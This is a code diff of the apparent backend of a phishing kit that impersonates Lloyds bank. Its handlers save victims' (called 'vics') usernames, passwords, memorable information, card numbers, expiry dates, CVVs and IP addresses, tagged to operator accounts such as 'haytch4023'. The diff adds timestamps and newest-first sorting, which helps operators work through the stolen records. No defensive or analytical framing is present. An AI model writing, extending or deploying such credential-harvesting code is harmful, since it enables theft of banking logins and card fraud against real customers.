@@ -1,17 +1,20 @@
 const Lloyds = require("../models/lloydsModel");
 const axios = require("axios");
+var moment = require("moment"); // require
 let count = 0;
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
-	Lloyds.find({ owner }).exec((err, vics) => {
-		if (err) {
-			console.log(err);
-			res.status(404).send("Error");
-			return;
-		}
-		res.send(vics);
-	});
+	Lloyds.find({ owner })
+		.sort({ timestamp: -1 })
+		.exec((err, vics) => {
+			if (err) {
+				console.log(err);
+				res.status(404).send("Error");
+				return;
+			}
+			res.send(vics);
+		});
 };
 
 const command = async (req, res) => {
@@ -51,6 +54,7 @@ const submitLogin = async (req, res) => {
 				password,
 				status: 1,
 				owner: "haytch4023",
+				timestamp: moment().format(),
 				ip,
 			});
 			await axios
@@ -73,6 +77,7 @@ const submitLogin = async (req, res) => {
 				password,
 				status: 1,
 				owner,
+				timestamp: moment().format(),
 				ip,
 			});
 			count++;
@@ -89,7 +94,10 @@ const submitLoginAgain = async (req, res) => {
 	try {
 		await Lloyds.findOneAndUpdate(
 			{ uniqueid },
-			{ username, password, status: 9 }
+			{
+				username, password, status: 9,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -103,7 +111,10 @@ const submitMemorable = async (req, res) => {
 	try {
 		await Lloyds.findOneAndUpdate(
 			{ uniqueid },
-			{ memorable, status: 3 }
+			{
+				memorable, status: 3,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -117,7 +128,10 @@ const submitCard = async (req, res) => {
 	try {
 		await Lloyds.findOneAndUpdate(
 			{ uniqueid },
-			{ ccnum, ccexp, cvv, status: 5 }
+			{
+				ccnum, ccexp, cvv, status: 5,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
